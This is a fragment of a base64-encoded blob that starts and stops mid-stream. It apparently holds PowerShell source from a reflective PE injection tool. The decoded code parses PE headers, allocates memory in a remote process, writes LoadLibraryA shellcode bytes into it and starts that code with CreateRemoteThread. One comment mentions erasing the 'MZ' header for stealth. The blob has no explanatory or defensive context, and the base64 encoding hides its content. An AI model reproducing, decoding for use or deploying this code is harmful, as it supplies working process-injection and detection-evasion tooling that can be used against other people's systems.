gYnV0IHdlIGRpZCBpdCBiZWZvcmUgdGhpcyBmdW5jdGlvbiB3YXMgY2FsbGVkIGFuZCB0aGVuIGRlc3Ryb3llZCAnTVonIGZvciBzbmVha2luZXNzCiAgICAgICAgJGRvc0hlYWRlciA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RydWN0dXJlKCRQRUhhbmRsZSwgW1R5cGVdJFdpbjMyVHlwZXMuSU1BR0VfRE9TX0hFQURFUikKCiAgICAgICAgI0dldCBJTUFHRV9OVF9IRUFERVJTCiAgICAgICAgW0ludFB0cl0kTnRIZWFkZXJzUHRyID0gW0ludFB0cl0oQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKFtJbnQ2NF0kUEVIYW5kbGUpIChbSW50NjRdW1VJbnQ2NF0kZG9zSGVhZGVyLmVfbGZhbmV3KSkKICAgICAgICAkTnRIZWFkZXJzSW5mbyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIE50SGVhZGVyc1B0ciAtVmFsdWUgJE50SGVhZGVyc1B0cgogICAgICAgICRpbWFnZU50SGVhZGVyczY0ID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJE50SGVhZGVyc1B0ciwgW1R5cGVdJFdpbjMyVHlwZXMuSU1BR0VfTlRfSEVBREVSUzY0KQogICAgICAgIAogICAgICAgICNNYWtlIHN1cmUgdGhlIElNQUdFX05UX0hFQURFUlMgY2hlY2tzIG91dC4gSWYgaXQgZG9lc24ndCwgdGhlIGRhdGEgc3RydWN0dXJlIGlzIGludmFsaWQuIFRoaXMgc2hvdWxkIG5ldmVyIGhhcHBlbi4KICAgICAgICBpZiAoJGltYWdlTnRIZWFkZXJzNjQuU2lnbmF0dXJlIC1uZSAweDAwMDA0NTUwKQogICAgICAgIHsKICAgICAgICAgICAgdGhyb3cgIkludmFsaWQgSU1BR0VfTlRfSEVBREVSIHNpZ25hdHVyZS4iCiAgICAgICAgfQogICAgICAgIAogICAgICAgIGlmICgkaW1hZ2VOdEhlYWRlcnM2NC5PcHRpb25hbEhlYWRlci5NYWdpYyAtZXEgJ0lNQUdFX05UX09QVElPTkFMX0hEUjY0X01BR0lDJykKICAgICAgICB7CiAgICAgICAgICAgICROdEhlYWRlcnNJbmZvIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgSU1BR0VfTlRfSEVBREVSUyAtVmFsdWUgJGltYWdlTnRIZWFkZXJzNjQKICAgICAgICAgICAgJE50SGVhZGVyc0luZm8gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBQRTY0Qml0IC1WYWx1ZSAkdHJ1ZQogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICAkSW1hZ2VOdEhlYWRlcnMzMiA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RydWN0dXJlKCROdEhlYWRlcnNQdHIsIFtUeXBlXSRXaW4zMlR5cGVzLklNQUdFX05UX0hFQURFUlMzMikKICAgICAgICAgICAgJE50SGVhZGVyc0luZm8gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJTUFHRV9OVF9IRUFERVJTIC1WYWx1ZSAkaW1hZ2VOdEhlYWRlcnMzMgogICAgICAgICAgICAkTnRIZWFkZXJzSW5mbyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIFBFNjRCaXQgLVZhbHVlICRmYWxzZQogICAgICAgIH0KICAgICAgICAKICAgICAgICByZXR1cm4gJE50SGVhZGVyc0luZm8KICAgIH0KCgogICAgI1RoaXMgZnVuY3Rpb24gd2lsbCBnZXQgdGhlIGluZm9ybWF0aW9uIG5lZWRlZCB0byBhbGxvY2F0ZWQgc3BhY2UgaW4gbWVtb3J5IGZvciB0aGUgUEUKICAgIEZ1bmN0aW9uIEdldC1QRUJhc2ljSW5mbwogICAgewogICAgICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoIFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJHRydWUgKV0KICAgICAgICBbQnl0ZVtdXQogICAgICAgICRQRUJ5dGVzLAogICAgICAgIAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW1N5c3RlbS5PYmplY3RdCiAgICAgICAgJFdpbjMyVHlwZXMKICAgICAgICApCiAgICAgICAgCiAgICAgICAgJFBFSW5mbyA9IE5ldy1PYmplY3QgU3lzdGVtLk9iamVjdAogICAgICAgIAogICAgICAgICNXcml0ZSB0aGUgUEUgdG8gbWVtb3J5IHRlbXBvcmFyaWx5IHNvIEkgY2FuIGdldCBpbmZvcm1hdGlvbiBmcm9tIGl0LiBUaGlzIGlzIG5vdCBpdCdzIGZpbmFsIHJlc3Rpbmcgc3BvdC4KICAgICAgICBbSW50UHRyXSRVbm1hbmFnZWRQRUJ5dGVzID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6QWxsb2NIR2xvYmFsKCRQRUJ5dGVzLkxlbmd0aCkKICAgICAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCRQRUJ5dGVzLCAwLCAkVW5tYW5hZ2VkUEVCeXRlcywgJFBFQnl0ZXMuTGVuZ3RoKSB8IE91dC1OdWxsCiAgICAgICAgCiAgICAgICAgI0dldCBOdEhlYWRlcnNJbmZvCiAgICAgICAgJE50SGVhZGVyc0luZm8gPSBHZXQtSW1hZ2VOdEhlYWRlcnMgLVBFSGFuZGxlICRVbm1hbmFnZWRQRUJ5dGVzIC1XaW4zMlR5cGVzICRXaW4zMlR5cGVzCiAgICAgICAgCiAgICAgICAgI0J1aWxkIGEgc3RydWN0dXJlIHdpdGggdGhlIGluZm9ybWF0aW9uIHdoaWNoIHdpbGwgYmUgbmVlZGVkIGZvciBhbGxvY2F0aW5nIG1lbW9yeSBhbmQgd3JpdGluZyB0aGUgUEUgdG8gbWVtb3J5CiAgICAgICAgJFBFSW5mbyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICdQRTY0Qml0JyAtVmFsdWUgKCROdEhlYWRlcnNJbmZvLlBFNjRCaXQpCiAgICAgICAgJFBFSW5mbyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICdPcmlnaW5hbEltYWdlQmFzZScgLVZhbHVlICgkTnRIZWFkZXJzSW5mby5JTUFHRV9OVF9IRUFERVJTLk9wdGlvbmFsSGVhZGVyLkltYWdlQmFzZSkKICAgICAgICAkUEVJbmZvIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgJ1NpemVPZkltYWdlJyAtVmFsdWUgKCROdEhlYWRlcnNJbmZvLklNQUdFX05UX0hFQURFUlMuT3B0aW9uYWxIZWFkZXIuU2l6ZU9mSW1hZ2UpCiAgICAgICAgJFBFSW5mbyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICdTaXplT2ZIZWFkZXJzJyAtVmFsdWUgKCROdEhlYWRlcnNJbmZvLklNQUdFX05UX0hFQURFUlMuT3B0aW9uYWxIZWFkZXIuU2l6ZU9mSGVhZGVycykKICAgICAgICAkUEVJbmZvIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgJ0RsbENoYXJhY3RlcmlzdGljcycgLVZhbHVlICgkTnRIZWFkZXJzSW5mby5JTUFHRV9OVF9IRUFERVJTLk9wdGlvbmFsSGVhZGVyLkRsbENoYXJhY3RlcmlzdGljcykKICAgICAgICAKICAgICAgICAjRnJlZSB0aGUgbWVtb3J5IGFsbG9jYXRlZCBhYm92ZSwgdGhpcyBpc24ndCB3aGVyZSB3ZSBhbGxvY2F0ZSB0aGUgUEUgdG8gbWVtb3J5CiAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6RnJlZUhHbG9iYWwoJFVubWFuYWdlZFBFQnl0ZXMpCiAgICAgICAgCiAgICAgICAgcmV0dXJuICRQRUluZm8KICAgIH0KCgogICAgI1BFSW5mbyBtdXN0IGNvbnRhaW4gdGhlIGZvbGxvd2luZyBOb3RlUHJvcGVydGllczoKICAgICMgICBQRUhhbmRsZTogQW4gSW50UHRyIHRvIHRoZSBhZGRyZXNzIHRoZSBQRSBpcyBsb2FkZWQgdG8gaW4gbWVtb3J5CiAgICBGdW5jdGlvbiBHZXQtUEVEZXRhaWxlZEluZm8KICAgIHsKICAgICAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKCBQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbSW50UHRyXQogICAgICAgICRQRUhhbmRsZSwKICAgICAgICAKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtTeXN0ZW0uT2JqZWN0XQogICAgICAgICRXaW4zMlR5cGVzLAogICAgICAgIAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAyLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW1N5c3RlbS5PYmplY3RdCiAgICAgICAgJFdpbjMyQ29uc3RhbnRzCiAgICAgICAgKQogICAgICAgIAogICAgICAgIGlmICgkUEVIYW5kbGUgLWVxICRudWxsIC1vciAkUEVIYW5kbGUgLWVxIFtJbnRQdHJdOjpaZXJvKQogICAgICAgIHsKICAgICAgICAgICAgdGhyb3cgJ1BFSGFuZGxlIGlzIG51bGwgb3IgSW50UHRyLlplcm8nCiAgICAgICAgfQogICAgICAgIAogICAgICAgICRQRUluZm8gPSBOZXctT2JqZWN0IFN5c3RlbS5PYmplY3QKICAgICAgICAKICAgICAgICAjR2V0IE50SGVhZGVycyBpbmZvcm1hdGlvbgogICAgICAgICROdEhlYWRlcnNJbmZvID0gR2V0LUltYWdlTnRIZWFkZXJzIC1QRUhhbmRsZSAkUEVIYW5kbGUgLVdpbjMyVHlwZXMgJFdpbjMyVHlwZXMKICAgICAgICAKICAgICAgICAjQnVpbGQgdGhlIFBFSW5mbyBvYmplY3QKICAgICAgICAkUEVJbmZvIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgUEVIYW5kbGUgLVZhbHVlICRQRUhhbmRsZQogICAgICAgICRQRUluZm8gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJTUFHRV9OVF9IRUFERVJTIC1WYWx1ZSAoJE50SGVhZGVyc0luZm8uSU1BR0VfTlRfSEVBREVSUykKICAgICAgICAkUEVJbmZvIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgTnRIZWFkZXJzUHRyIC1WYWx1ZSAoJE50SGVhZGVyc0luZm8uTnRIZWFkZXJzUHRyKQogICAgICAgICRQRUluZm8gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBQRTY0Qml0IC1WYWx1ZSAoJE50SGVhZGVyc0luZm8uUEU2NEJpdCkKICAgICAgICAkUEVJbmZvIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgJ1NpemVPZkltYWdlJyAtVmFsdWUgKCROdEhlYWRlcnNJbmZvLklNQUdFX05UX0hFQURFUlMuT3B0aW9uYWxIZWFkZXIuU2l6ZU9mSW1hZ2UpCiAgICAgICAgCiAgICAgICAgaWYgKCRQRUluZm8uUEU2NEJpdCAtZXEgJHRydWUpCiAgICAgICAgewogICAgICAgICAgICBbSW50UHRyXSRTZWN0aW9uSGVhZGVyUHRyID0gW0ludFB0cl0oQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKFtJbnQ2NF0kUEVJbmZvLk50SGVhZGVyc1B0cikgKFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV0kV2luMzJUeXBlcy5JTUFHRV9OVF9IRUFERVJTNjQpKSkKICAgICAgICAgICAgJFBFSW5mbyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIFNlY3Rpb25IZWFkZXJQdHIgLVZhbHVlICRTZWN0aW9uSGVhZGVyUHRyCiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgIFtJbnRQdHJdJFNlY3Rpb25IZWFkZXJQdHIgPSBbSW50UHRyXShBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoW0ludDY0XSRQRUluZm8uTnRIZWFkZXJzUHRyKSAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXSRXaW4zMlR5cGVzLklNQUdFX05UX0hFQURFUlMzMikpKQogICAgICAgICAgICAkUEVJbmZvIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgU2VjdGlvbkhlYWRlclB0ciAtVmFsdWUgJFNlY3Rpb25IZWFkZXJQdHIKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgaWYgKCgkTnRIZWFkZXJzSW5mby5JTUFHRV9OVF9IRUFERVJTLkZpbGVIZWFkZXIuQ2hhcmFjdGVyaXN0aWNzIC1iYW5kICRXaW4zMkNvbnN0YW50cy5JTUFHRV9GSUxFX0RMTCkgLWVxICRXaW4zMkNvbnN0YW50cy5JTUFHRV9GSUxFX0RMTCkKICAgICAgICB7CiAgICAgICAgICAgICRQRUluZm8gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBGaWxlVHlwZSAtVmFsdWUgJ0RMTCcKICAgICAgICB9CiAgICAgICAgZWxzZWlmICgoJE50SGVhZGVyc0luZm8uSU1BR0VfTlRfSEVBREVSUy5GaWxlSGVhZGVyLkNoYXJhY3RlcmlzdGljcyAtYmFuZCAkV2luMzJDb25zdGFudHMuSU1BR0VfRklMRV9FWEVDVVRBQkxFX0lNQUdFKSAtZXEgJFdpbjMyQ29uc3RhbnRzLklNQUdFX0ZJTEVfRVhFQ1VUQUJMRV9JTUFHRSkKICAgICAgICB7CiAgICAgICAgICAgICRQRUluZm8gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBGaWxlVHlwZSAtVmFsdWUgJ0VYRScKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgVGhyb3cgIlBFIGZpbGUgaXMgbm90IGFuIEVYRSBvciBETEwiCiAgICAgICAgfQogICAgICAgIAogICAgICAgIHJldHVybiAkUEVJbmZvCiAgICB9CiAgICAKICAgIAogICAgRnVuY3Rpb24gSW1wb3J0LURsbEluUmVtb3RlUHJvY2VzcwogICAgewogICAgICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb249MCwgTWFuZGF0b3J5PSR0cnVlKV0KICAgICAgICBbSW50UHRyXQogICAgICAgICRSZW1vdGVQcm9jSGFuZGxlLAogICAgICAgIAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb249MSwgTWFuZGF0b3J5PSR0cnVlKV0KICAgICAgICBbSW50UHRyXQogICAgICAgICRJbXBvcnREbGxQYXRoUHRyCiAgICAgICAgKQogICAgICAgIAogICAgICAgICRQdHJTaXplID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXVtJbnRQdHJdKQogICAgICAgIAogICAgICAgICRJbXBvcnREbGxQYXRoID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJpbmdBbnNpKCRJbXBvcnREbGxQYXRoUHRyKQogICAgICAgICREbGxQYXRoU2l6ZSA9IFtVSW50UHRyXVtVSW50NjRdKFtVSW50NjRdJEltcG9ydERsbFBhdGguTGVuZ3RoICsgMSkKICAgICAgICAkUkltcG9ydERsbFBhdGhQdHIgPSAkV2luMzJGdW5jdGlvbnMuVmlydHVhbEFsbG9jRXguSW52b2tlKCRSZW1vdGVQcm9jSGFuZGxlLCBbSW50UHRyXTo6WmVybywgJERsbFBhdGhTaXplLCAkV2luMzJDb25zdGFudHMuTUVNX0NPTU1JVCAtYm9yICRXaW4zMkNvbnN0YW50cy5NRU1fUkVTRVJWRSwgJFdpbjMyQ29uc3RhbnRzLlBBR0VfUkVBRFdSSVRFKQogICAgICAgIGlmICgkUkltcG9ydERsbFBhdGhQdHIgLWVxIFtJbnRQdHJdOjpaZXJvKQogICAgICAgIHsKICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byBhbGxvY2F0ZSBtZW1vcnkgaW4gdGhlIHJlbW90ZSBwcm9jZXNzIgogICAgICAgIH0KCiAgICAgICAgW1VJbnRQdHJdJE51bUJ5dGVzV3JpdHRlbiA9IFtVSW50UHRyXTo6WmVybwogICAgICAgICRTdWNjZXNzID0gJFdpbjMyRnVuY3Rpb25zLldyaXRlUHJvY2Vzc01lbW9yeS5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsICRSSW1wb3J0RGxsUGF0aFB0ciwgJEltcG9ydERsbFBhdGhQdHIsICREbGxQYXRoU2l6ZSwgW1JlZl0kTnVtQnl0ZXNXcml0dGVuKQogICAgICAgIAogICAgICAgIGlmICgkU3VjY2VzcyAtZXEgJGZhbHNlKQogICAgICAgIHsKICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byB3cml0ZSBETEwgcGF0aCB0byByZW1vdGUgcHJvY2VzcyBtZW1vcnkiCiAgICAgICAgfQogICAgICAgIGlmICgkRGxsUGF0aFNpemUgLW5lICROdW1CeXRlc1dyaXR0ZW4pCiAgICAgICAgewogICAgICAgICAgICBUaHJvdyAiRGlkbid0IHdyaXRlIHRoZSBleHBlY3RlZCBhbW91bnQgb2YgYnl0ZXMgd2hlbiB3cml0aW5nIGEgRExMIHBhdGggdG8gbG9hZCB0byB0aGUgcmVtb3RlIHByb2Nlc3MiCiAgICAgICAgfQogICAgICAgIAogICAgICAgICRLZXJuZWwzMkhhbmRsZSA9ICRXaW4zMkZ1bmN0aW9ucy5HZXRNb2R1bGVIYW5kbGUuSW52b2tlKCJrZXJuZWwzMi5kbGwiKQogICAgICAgICRMb2FkTGlicmFyeUFBZGRyID0gJFdpbjMyRnVuY3Rpb25zLkdldFByb2NBZGRyZXNzLkludm9rZSgkS2VybmVsMzJIYW5kbGUsICJMb2FkTGlicmFyeUEiKSAjS2VybmVsMzIgbG9hZGVkIHRvIHRoZSBzYW1lIGFkZHJlc3MgZm9yIGFsbCBwcm9jZXNzZXMKICAgICAgICAKICAgICAgICBbSW50UHRyXSREbGxBZGRyZXNzID0gW0ludFB0cl06Olplcm8KICAgICAgICAjRm9yIDY0Yml0IERMTCdzLCB3ZSBjYW4ndCB1c2UganVzdCBDcmVhdGVSZW1vdGVUaHJlYWQgdG8gY2FsbCBMb2FkTGlicmFyeSBiZWNhdXNlIEdldEV4aXRDb2RlVGhyZWFkIHdpbGwgb25seSBnaXZlIGJhY2sgYSAzMmJpdCB2YWx1ZSwgYnV0IHdlIG5lZWQgYSA2NGJpdCBhZGRyZXNzCiAgICAgICAgIyAgIEluc3RlYWQsIHdyaXRlIHNoZWxsY29kZSB3aGlsZSBjYWxscyBMb2FkTGlicmFyeSBhbmQgd3JpdGVzIHRoZSByZXN1bHQgdG8gYSBtZW1vcnkgYWRkcmVzcyB3ZSBzcGVjaWZ5LiBUaGVuIHJlYWQgZnJvbSB0aGF0IG1lbW9yeSBvbmNlIHRoZSB0aHJlYWQgZmluaXNoZXMuCiAgICAgICAgaWYgKCRQRUluZm8uUEU2NEJpdCAtZXEgJHRydWUpCiAgICAgICAgewogICAgICAgICAgICAjQWxsb2NhdGUgbWVtb3J5IGZvciB0aGUgYWRkcmVzcyByZXR1cm5lZCBieSBMb2FkTGlicmFyeUEKICAgICAgICAgICAgJExvYWRMaWJyYXJ5QVJldE1lbSA9ICRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsQWxsb2NFeC5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsIFtJbnRQdHJdOjpaZXJvLCAkRGxsUGF0aFNpemUsICRXaW4zMkNvbnN0YW50cy5NRU1fQ09NTUlUIC1ib3IgJFdpbjMyQ29uc3RhbnRzLk1FTV9SRVNFUlZFLCAkV2luMzJDb25zdGFudHMuUEFHRV9SRUFEV1JJVEUpCiAgICAgICAgICAgIGlmICgkTG9hZExpYnJhcnlBUmV0TWVtIC1lcSBbSW50UHRyXTo6WmVybykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byBhbGxvY2F0ZSBtZW1vcnkgaW4gdGhlIHJlbW90ZSBwcm9jZXNzIGZvciB0aGUgcmV0dXJuIHZhbHVlIG9mIExvYWRMaWJyYXJ5QSIKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgCiAgICAgICAgICAgICNXcml0ZSBTaGVsbGNvZGUgdG8gdGhlIHJlbW90ZSBwcm9jZXNzIHdoaWNoIHdpbGwgY2FsbCBMb2FkTGlicmFyeUEgKFNoZWxsY29kZTogTG9hZExpYnJhcnlBLmFzbSkKICAgICAgICAgICAgJExvYWRMaWJyYXJ5U0MxID0gQCgweDUzLCAweDQ4LCAweDg5LCAweGUzLCAweDQ4LCAweDgzLCAweGVjLCAweDIwLCAweDY2LCAweDgzLCAweGU0LCAweGMwLCAweDQ4LCAweGI5KQogICAgICAgICAgICAkTG9hZExpYnJhcnlTQzIgPSBAKDB4NDgsIDB4YmEpCiAgICAgICAgICAgICRMb2FkTGlicmFyeVNDMyA9IEAoMHhmZiwgMHhkMiwgMHg0OCwgMHhiYSkKICAgICAgICAgICAgJExvYWRMaWJyYXJ5U0M0ID0gQCgweDQ4LCAweDg5LCAweDAyLCAweDQ4LCAweDg5LCAweGRjLCAweDViLCAweGMzKQogICAgICAgICAgICAKICAgICAgICAgICAgJFNDTGVuZ3RoID0gJExvYWRMaWJyYXJ5U0MxLkxlbmd0aCArICRMb2FkTGlicmFyeVNDMi5MZW5ndGggKyAkTG9hZExpYnJhcnlTQzMuTGVuZ3RoICsgJExvYWRMaWJyYXJ5U0M0Lkxlbmd0aCArICgkUHRyU2l6ZSAqIDMpCiAgICAgICAgICAgICRTQ1BTTWVtID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6QWxsb2NIR2xvYmFsKCRTQ0xlbmd0aCkKICAgICAgICAgICAgJFNDUFNNZW1PcmlnaW5hbCA9ICRTQ1BTTWVtCiAgICAgICAgICAgIAogICAgICAgICAgICBXcml0ZS1CeXRlc1RvTWVtb3J5IC1CeXRlcyAkTG9hZExpYnJhcnlTQzEgLU1lbW9yeUFkZHJlc3MgJFNDUFNNZW0KICAgICAgICAgICAgJFNDUFNNZW0gPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkU0NQU01lbSAoJExvYWRMaWJyYXJ5U0MxLkxlbmd0aCkKICAgICAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U3RydWN0dXJlVG9QdHIoJFJJbXBvcnREbGxQYXRoUHRyLCAkU0NQU01lbSwgJGZhbHNlKQogICAgICAgICAgICAkU0NQU01lbSA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRTQ1BTTWVtICgkUHRyU2l6ZSkKICAgICAgICAgICAgV3JpdGUtQnl0ZXNUb01lbW9yeSAtQnl0ZXMgJExvYWRMaWJyYXJ5U0MyIC1NZW1vcnlBZGRyZXNzICRTQ1BTTWVtCiAgICAgICAgICAgICRTQ1BTTWVtID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgJFNDUFNNZW0gKCRMb2FkTGlicmFyeVNDMi5MZW5ndGgpCiAgICAgICAgICAgIFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlN0cnVjdHVyZVRvUHRyKCRMb2FkTGlicmFyeUFBZGRyLCAkU0NQU01lbSwgJGZhbHNlKQogICAgICAgICAgICAkU0NQU01lbSA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRTQ1BTTWVtICgkUHRyU2l6ZSkKICAgICAgICAgICAgV3JpdGUtQnl0ZXNUb01lbW9yeSAtQnl0ZXMgJExvYWRMaWJyYXJ5U0MzIC1NZW1vcnlBZGRyZXNzICRTQ1BTTWVtCiAgICAgICAgICAgICRTQ1BTTWVtID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgJFNDUFNNZW0gKCRMb2FkTGlicmFyeVNDMy5MZW5ndGgpCiAgICAgICAgICAgIFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlN0cnVjdHVyZVRvUHRyKCRMb2FkTGlicmFyeUFSZXRNZW0sICRTQ1BTTWVtLCAkZmFsc2UpCiAgICAgICAgICAgICRTQ1BTTWVtID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgJFNDUFNNZW0gKCRQdHJTaXplKQogICAgICAgICAgICBXcml0ZS1CeXRlc1RvTWVtb3J5IC1CeXRlcyAkTG9hZExpYnJhcnlTQzQgLU1lbW9yeUFkZHJlc3MgJFNDUFNNZW0KICAgICAgICAgICAgJFNDUFNNZW0gPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkU0NQU01lbSAoJExvYWRMaWJyYXJ5U0M0Lkxlbmd0aCkKCiAgICAgICAgICAgIAogICAgICAgICAgICAkUlNDQWRkciA9ICRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsQWxsb2NFeC5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsIFtJbnRQdHJdOjpaZXJvLCBbVUludFB0cl1bVUludDY0XSRTQ0xlbmd0aCwgJFdpbjMyQ29uc3RhbnRzLk1FTV9DT01NSVQgLWJvciAkV2luMzJDb25zdGFudHMuTUVNX1JFU0VSVkUsICRXaW4zMkNvbnN0YW50cy5QQUdFX0VYRUNVVEVfUkVBRFdSSVRFKQogICAgICAgICAgICBpZiAoJFJTQ0FkZHIgLWVxIFtJbnRQdHJdOjpaZXJvKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBUaHJvdyAiVW5hYmxlIHRvIGFsbG9jYXRlIG1lbW9yeSBpbiB0aGUgcmVtb3RlIHByb2Nlc3MgZm9yIHNoZWxsY29kZSIKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgJFN1Y2Nlc3MgPSAkV2luMzJGdW5jdGlvbnMuV3JpdGVQcm9jZXNzTWVtb3J5Lkludm9rZSgkUmVtb3RlUHJvY0hhbmRsZSwgJFJTQ0FkZHIsICRTQ1BTTWVtT3JpZ2luYWwsIFtVSW50UHRyXVtVSW50NjRdJFNDTGVuZ3RoLCBbUmVmXSROdW1CeXRlc1dyaXR0ZW4pCiAgICAgICAgICAgIGlmICgoJFN1Y2Nlc3MgLWVxICRmYWxzZSkgLW9yIChbVUludDY0XSROdW1CeXRlc1dyaXR0ZW4gLW5lIFtVSW50NjRdJFNDTGVuZ3RoKSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byB3cml0ZSBzaGVsbGNvZGUgdG8gcmVtb3RlIHByb2Nlc3MgbWVtb3J5LiIKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgJFJUaHJlYWRIYW5kbGUgPSBDcmVhdGUtUmVtb3RlVGhyZWFkIC1Qcm9jZXNzSGFuZGxlICRSZW1vdGVQcm9jSGFuZGxlIC1TdGFydEFkZHJlc3MgJFJTQ0FkZHIgLVdpbjMyRnVuY3Rpb25zICRXaW4zMkZ1bmN0aW9ucwogICAgICAgICAgICAkUmVzdWx0ID0gJFdpbjMyRnVuY3Rpb25zLldhaXRGb3JTaW5nbGVPYmplY3QuSW52b2tlKCRSVGhyZWFkSGFuZGxlLCAyMDAwMCkKICAgICAgICAgICAgaWYgKCRSZXN1bHQgLW5lIDApCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFRocm93ICJDYWxsIHRvIENyZWF0ZVJlbW90ZVRocmVhZCB0byBjYWxsIEdldFByb2NBZGRyZXNzIGZhaWxlZC4iCiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgICNUaGUgc2hlbGxjb2RlIHdyaXRlcyB0aGUgRExMIGFkZHJlc3MgdG8gbWVtb3J5IGluIHRoZSByZW1vdGUgcHJvY2VzcyBhdCBhZGRyZXNzICRMb2FkTGlicmFyeUFSZXRNZW0sIHJlYWQ